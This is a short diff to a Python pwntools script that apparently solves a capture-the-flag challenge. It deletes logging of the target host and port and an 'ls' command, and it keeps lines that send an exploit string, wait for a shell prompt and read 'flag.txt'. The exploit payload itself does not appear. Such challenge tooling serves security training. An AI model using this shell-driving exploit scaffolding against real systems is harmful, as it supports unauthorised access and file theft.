@@ -6,10 +6,6 @@ from pwn import *
 HOST = os.environ.get("VICTIM_HOSTNAME", "avatar")
 PORT = os.environ.get("PORT", "1337")
 
-# Printing the required environment variables
-log.info(f"{HOST=}")
-log.info(f"{PORT=}")
-
 context.log_level = "error"
 
 
@@ -39,7 +35,6 @@ try:
     io.recvuntil(b"input: ")
     io.sendline(exploit.encode("ascii"))
     io.recvuntil(b"$", timeout=5)
-    io.sendline(b"ls")
     io.sendline(b"cat flag.txt")
     output = io.recvall(timeout=5).decode("ascii")
     print(output)
